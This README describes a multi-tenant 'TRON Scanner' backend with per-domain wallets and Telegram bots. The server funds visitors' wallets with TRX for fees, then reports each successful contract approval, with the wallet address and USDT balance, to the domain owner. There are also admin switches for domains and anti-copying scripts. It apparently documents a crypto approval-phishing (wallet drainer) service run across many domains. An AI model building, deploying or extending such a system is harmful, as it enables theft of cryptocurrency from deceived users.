# 🚀 TRON Scanner Multi-Tenant Backend

## 🎯 Purpose
This backend supports **multiple domains (tenants)** with separate wallets and Telegram bots. Each domain automatically:
1. **Sends TRX top-ups** to users who need funding
2. **Sends Telegram notifications** for:
   - ✅ **Top-up notifications** - When TRX is sent to a user
   - ✅ **Approval notifications** - When user successfully approves contract (only on success)

## 🔧 Multi-Tenant Architecture

### How It Works
- Server **auto-detects domain** from request headers (Origin, Host, or Referer)
- Each domain has its own:
  - TRON wallet (private key + address)
  - Telegram bot (bot token + chat ID)
  - Configuration (auto-send amount, minimum balance)
- Notifications are sent to the **specific Telegram bot** for that domain

## 📋 Setup Instructions

### Step 1: Configure Tenants

Edit `tenants.json` file and add your domains:

```json
{
  "user1.com": {
    "tronPrivateKey": "user1_private_key_here",
    "tronAddress": "user1_tron_address_here",
    "telegramBotToken": "user1_telegram_bot_token",
    "telegramChatId": "user1_telegram_chat_id",
    "autoSendAmount": 13,
    "minimumBalance": 11
  },
  "user2.com": {
    "tronPrivateKey": "user2_private_key_here",
    "tronAddress": "user2_tron_address_here",
    "telegramBotToken": "user2_telegram_bot_token",
    "telegramChatId": "user2_telegram_chat_id",
    "autoSendAmount": 13,
    "minimumBalance": 11
  }
}
```

### Step 2: Environment Variables

Set these in your Railway/deployment platform:

```bash
PORT=3000
ADMIN_KEY=your_secure_admin_key_here  # For admin endpoints
NODE_ENV=production
```

**Note:** Tenant configurations are stored in `tenants.json`, NOT in environment variables.

### Step 3: Deploy

1. Push code to GitHub
2. Deploy to Railway (or your platform)
3. The server will automatically load tenant configurations

## 📡 API Endpoints

### Public Endpoints (Domain-Aware)

#### Health Check
```
GET /health
```
Returns server status and number of configured tenants.

#### Check User Balance
```
POST /check-balance
Headers: Origin: https://user1.com
Body: { "userAddress": "TUserAddress..." }
```
Checks if user has enough TRX balance. Uses tenant config for the domain.

#### Send TRX Automatically
```
POST /send-trx
Headers: Origin: https://user1.com
Body: { "userAddress": "TUserAddress..." }
```
Automatically sends TRX if user needs funding. **Sends Notification 1 (Top-Up)** when TRX is sent.

#### Contract Approval Notification
```
POST /telegram-notify
Headers: Origin: https://user1.com
Body: {
  "type": "transaction_approve",
  "walletAddress": "TUserAddress...",
  "transactionId": "tx_hash...",
  "amount": 13000000,
  "trxBalance": 15.5,
  "usdtBalance": 100.0,
  "approved": true
}
```
**Sends Notification 2 (Approval)** - **ONLY if approval is successful** (`approved: true` and transaction status is SUCCESS).

#### Transaction Status
```
POST /transaction-status
Headers: Origin: https://user1.com
Body: { "transactionId": "tx_hash..." }
```
Checks transaction confirmation status using tenant's wallet.

#### Server Info
```
GET /server-info
Headers: Origin: https://user1.com
```
Returns tenant-specific server configuration.

#### Verify Domain Authorization
```
GET /verify-domain
Headers: Origin: https://user1.com
```
Check if a domain is authorized to use the service. Returns `authorized: true/false`.

### Admin Endpoints

#### Add New Tenant
```
POST /admin/add-tenant
Body: {
  "adminKey": "your_admin_key",
  "domain": "newuser.com",
  "tronPrivateKey": "private_key",
  "tronAddress": "tron_address",
  "telegramBotToken": "bot_token",
  "telegramChatId": "chat_id",
  "autoSendAmount": 13,
  "minimumBalance": 11
}
```

#### List All Tenants
```
GET /admin/tenants?adminKey=your_admin_key
```
Returns list of all tenants with their enabled status.

#### Enable/Disable Domain (Turn Website On/Off)
```
POST /admin/toggle-domain
Body: {
  "adminKey": "your_admin_key",
  "domain": "trchealth.live",
  "enabled": true  // or false
}
```

#### Enable Domain (Turn Website On)
```
POST /admin/enable-domain
Body: {
  "adminKey": "your_admin_key",
  "domain": "trchealth.live"
}
```

#### Disable Domain (Turn Website Off)
```
POST /admin/disable-domain
Body: {
  "adminKey": "your_admin_key",
  "domain": "trchealth.live"
}
```

**🎛️ Control websites on/off from backend without editing frontend!** See `WEBSITE_CONTROL.md` for details.

## 🔔 Notification System

### Notification 1: Top-Up Notification
**When:** TRX is successfully sent to a user wallet
**Sent to:** Domain owner's Telegram bot
**Message includes:**
- Domain name
- Amount sent
- User wallet address
- Transaction ID
- Timestamp

### Notification 2: Approval Notification
**When:** User successfully approves contract transaction
**Conditions:**
- ✅ `approved: true` in request body
- ✅ Transaction status is SUCCESS (verified on-chain)
- ✅ Not a duplicate notification

**Sent to:** Domain owner's Telegram bot
**Message includes:**
- Domain name
- User wallet address
- Transaction ID
- Approval amount
- Current TRX and USDT balances
- Timestamp

**Note:** If user already has TRX (top-up skipped), only approval notification will be sent when they approve.

## 🔒 Security Features

### Backend Protection:
- ✅ **Strict Domain Whitelist** - Only domains in `tenants.json` can access the API
- ✅ **CORS Protection** - CORS is dynamically configured to only allow authorized domains
- ✅ **Domain Validation** - Every request is validated against the whitelist
- ✅ **Unauthorized Access Blocking** - Unauthorized domains are completely blocked
- ✅ **Access Logging** - All unauthorized access attempts are logged
- ✅ **Rate limiting** (100 requests per 15 minutes per IP)
- ✅ **Helmet security headers**
- ✅ **Input validation** for all endpoints
- ✅ **Admin key protection** for tenant management

### Frontend Protection:
- ✅ **Website Blocking** - Frontend won't load on unauthorized domains
- ✅ **Domain Check Script** - Runs before website loads to verify authorization
- ✅ **Source Code Protection** - Even if someone copies your code, website won't work
- ✅ **Automatic Blocking** - Unauthorized domains see blocking page instead of website

**See `FRONTEND_SETUP.md` for frontend protection setup instructions.**

### Domain Authorization

**Important:** Only domains you add to `tenants.json` can use your service. Unauthorized domains will:
- Be blocked by CORS
- Receive 403 Forbidden error
- Have their access attempts logged

**To authorize a domain:**
1. Add domain configuration to `tenants.json`
2. Domain is automatically whitelisted
3. Domain can now access all API endpoints

**To revoke access:**
1. Remove domain from `tenants.json`
2. Domain is immediately blocked
3. All requests from that domain will be rejected

## 💰 How It Works

### Flow 1: User Needs Top-Up
1. User connects wallet from `user1.com`
2. Frontend calls `/check-balance` (server detects `user1.com`)
3. If balance < minimum, frontend calls `/send-trx`
4. Server uses **User1's wallet** to send TRX
5. **Notification 1 sent** to User1's Telegram bot
6. User approves contract
7. Frontend calls `/telegram-notify` with `approved: true`
8. **Notification 2 sent** to User1's Telegram bot

### Flow 2: User Already Has TRX
1. User connects wallet from `user1.com` (already has TRX)
2. Frontend calls `/check-balance` → balance sufficient
3. Top-up is **skipped** (no Notification 1)
4. User approves contract
5. Frontend calls `/telegram-notify` with `approved: true`
6. **Notification 2 sent** to User1's Telegram bot

## 🌐 Domain Detection

The server detects domain from request headers in this order:
1. `Origin` header (from browser)
2. `Host` header
3. `Referer` header

**Important:** Frontend must send requests with proper headers. If domain is not detected, request will fail.

## 📝 Frontend Integration

### Example: Send Approval Notification

```javascript
// After user approves contract successfully
async function notifyApproval(walletAddress, transactionId, amount, trxBalance, usdtBalance) {
    try {
        const response = await fetch('https://your-server.railway.app/telegram-notify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Origin': window.location.origin  // Important: Include origin
            },
            body: JSON.stringify({
                type: 'transaction_approve',
                walletAddress: walletAddress,
                transactionId: transactionId,
                amount: amount,  // Amount in sun (e.g., 13000000 for 13 TRX)
                trxBalance: trxBalance,
                usdtBalance: usdtBalance,
                approved: true  // Only send if approval was successful
            })
        });
        
        const data = await response.json();
        console.log('Notification sent:', data);
    } catch (error) {
        console.error('Failed to send notification:', error);
    }
}
```

## ⚠️ Important Notes

1. **Each domain needs its own wallet** - Fund each tenant's wallet separately
2. **Each domain needs its own Telegram bot** - Create separate bots for each owner
3. **Domain must be exact match** - `user1.com` ≠ `www.user1.com` (www is automatically removed)
4. **Approval notifications only on success** - Failed approvals won't trigger notifications
5. **Duplicate prevention** - Same transaction won't send notification twice

## 🆘 Troubleshooting

### Domain Not Authorized / 403 Forbidden
- **Check domain is in `tenants.json`** - Only configured domains are allowed
- Ensure domain spelling matches exactly (case-insensitive, www is auto-removed)
- Verify `Origin` header is being sent from frontend
- Check server logs for unauthorized access attempts

### Domain Not Detected
- Ensure frontend sends `Origin` header
- Check that domain is configured in `tenants.json`
- Verify domain spelling (case-insensitive, but must match)

### CORS Errors
- Domain must be in `tenants.json` to pass CORS
- Check browser console for CORS error details
- Verify `Origin` header matches configured domain

### Notifications Not Sending
- Check Telegram bot token and chat ID in `tenants.json`
- Verify bot has permission to send messages
- Check server logs for errors

### Wrong Wallet Used
- Verify domain detection is working
- Check `tenants.json` has correct wallet for domain
- Ensure domain matches exactly (without www)

### Unauthorized Access Attempts
- Check server logs for `🚫 Unauthorized domain access attempt` messages
- These indicate someone is trying to use your service without authorization
- Only domains in `tenants.json` can access the service

## 📊 Monitoring

- Check `/health` endpoint for server status
- Use `/admin/tenants` to list all configured domains
- Monitor server logs for domain-specific operations
- Each log entry includes `[domain]` prefix for easy filtering
- Check for `🚫 Unauthorized domain access attempt` in logs

## 🛡️ Complete Protection

This system provides **two layers of protection**:

1. **Backend Protection** - API endpoints only work for authorized domains
2. **Frontend Protection** - Website won't even load on unauthorized domains

### To Enable Frontend Protection:

1. Copy `domain-check.js` to your frontend project
2. Update `BACKEND_URL` in `domain-check.js`
3. Add script to `index.html` BEFORE your main app script
4. Deploy frontend

**See `FRONTEND_SETUP.md` for detailed instructions.**

### Result:

- ✅ Authorized domains → Website loads normally
- ❌ Unauthorized domains → Blocking page, website doesn't load
- 🔒 Source code protection → Even copied code won't work without authorization
